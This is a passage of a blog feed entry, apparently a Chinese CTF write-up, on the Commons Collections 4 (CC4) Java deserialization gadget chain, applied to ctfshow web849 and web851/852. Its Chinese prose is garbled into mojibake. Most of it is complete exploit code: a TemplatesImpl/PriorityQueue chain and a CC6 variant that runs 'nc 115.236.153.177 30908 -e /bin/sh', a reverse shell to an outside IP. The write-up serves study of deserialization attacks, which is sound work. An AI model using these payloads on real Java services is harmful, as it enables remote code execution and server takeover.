 <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240904215559380.png" alt="image-20240904215559380"></p><p>ä½†æ˜¯ã€‚ã€‚ã€‚ç»“æŸäº†å—ï¼Ÿåªè¦æŠŠUnSerializeæ³¨é‡Šæ‰å°±ä¼šå‘ç°ä¸€ä»¶äº‹ï¼Œè®¡ç®—å™¨æ˜¯åœ¨Serializeçš„æ—¶å€™å¼¹å‡ºçš„ï¼Œæå‰è§¦å‘äº†å‘½ä»¤æ‰§è¡Œï¼Œå’Œä¹‹å‰cc3ã€cc6ä¸€æ ·ï¼Œä¾æ—§éœ€è¦fakeTransformers å‡ºåœº</p><h1 id="æœ€ç»ˆçš„EXP"><a href="#æœ€ç»ˆçš„EXP" class="headerlink" title="æœ€ç»ˆçš„EXP"></a>æœ€ç»ˆçš„EXP</h1><p>é‚£ä¹ˆå¾—åˆ°æˆ‘ä»¬æœ€åçš„expï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc4</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>GenerateEvil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> obj <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">PriorityQueue</span> priorityQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        priorityQueue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>priorityQueue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><h2 id="ctfshow-web849"><a href="#ctfshow-web849" class="headerlink" title="ctfshow web849"></a>ctfshow web849</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">æäº¤ctfshowå‚æ•°è¿›è¡Œbase64è§£ç ç„¶åè¿›è¡Œååºåˆ—åŒ–æˆ‘æ˜¯java8ï¼Œä½¿ç”¨äº†commons<span class="token operator">-</span>collections <span class="token number">4.0</span>çš„åº“ä¸ºäº†ä¿è¯ä¸šåŠ¡å®‰å…¨ï¼Œæˆ‘åˆ é™¤äº†curlå‘½ä»¤ä¸‹é¢æ˜¯æˆ‘æ¥æ”¶å‚æ•°çš„ä»£ç data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ‰“cc4å°±å¯ä»¥ncå¼¹shell</p><p><img src="/blog/2024/09/04/CC4%E9%93%BE/image-20240905173206680.png" alt="image-20240905173206680"></p><hr><h2 id="ctfshow-web851-amp-852"><a href="#ctfshow-web851-amp-852" class="headerlink" title="ctfshow web851&amp;852"></a>ctfshow web851&amp;852</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">æäº¤ctfshowå‚æ•°è¿›è¡Œbase64è§£ç ç„¶åè¿›è¡Œååºåˆ—åŒ–æˆ‘æ˜¯java8ï¼Œä½¿ç”¨äº†commons<span class="token operator">-</span>collections <span class="token number">4.0</span>çš„åº“å¹¶å¯¹ä¸€äº›å¯èƒ½æœ‰å±é™©çš„ç±»è¿›è¡Œäº†å°ç¦ï¼Œä¸ºäº†ä¿è¯ä¸šåŠ¡å®‰å…¨ï¼Œæˆ‘åˆ é™¤äº†curlå‘½ä»¤ä¸‹é¢æ˜¯æˆ‘æ¥æ”¶å‚æ•°çš„ä»£ç data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cc6é“¾å­æ”¹cc4çš„åº“å³å¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc6</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> cc6Ver4 <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"nc 115.236.153.177 30908 -e /bin/sh"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span> transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span> transformerChain<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tme <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span> <span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tme<span class="token punctuation">,</span> <span class="token string">"valuevalue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"keykey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>transformerChain<span class="token punctuation">,</span> <span class="token string">"iTransformers"</span><span class="token punctuation">,</span> transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        Utils.UnSerialize(barr);</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™å‡ å¤©é‡æ–°æŠŠå‰é¢å››æ¡é“¾å­è¿‡äº†ä¸€éæ›´æ–°äº†åšå®¢ï¼Œé¢‡æœ‰æ”¶è·&lt;/p&gt;
&lt;p&gt;ä¹Ÿæ˜¯åœ¨å¿«5ä¸ªæœˆä¹‹åé‡æ–°æ¡èµ·æ¥ccé“¾äº†&lt;/p&gt;
&lt;br&gt;

&lt;p&gt;åœ¨2015å¹´ commons-collections ååºåˆ—åŒ–åˆ©ç”¨é“¾è¢«æå‡ºæ—¶ï¼ŒApache Commons Collectionsæœ‰ä»¥ä¸‹ä¸¤ä¸ªåˆ†æ”¯ç‰ˆæœ¬ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;commons-collections:commons-collections&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;org.apache.commons:commons-collections4&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å‰è€…æ˜¯è€ç‰ˆæœ¬çš„åŒ…ï¼Œå½“æ—¶ç‰ˆæœ¬æ˜¯3.2.1ï¼›è€Œåè€…æ˜¯å®˜æ–¹åœ¨2013å¹´æ¨å‡ºçš„4ç‰ˆæœ¬ï¼Œå½“æ—¶çš„ç‰ˆæœ¬å·æ˜¯4.0ï¼›ä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œå› æ­¤å¯ä»¥å…±å­˜åœ¨åŒä¸€ä¸ªé¡¹ç›®ä¸­&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/&quot;&gt;https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8706-CC4%E9%93%BE/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
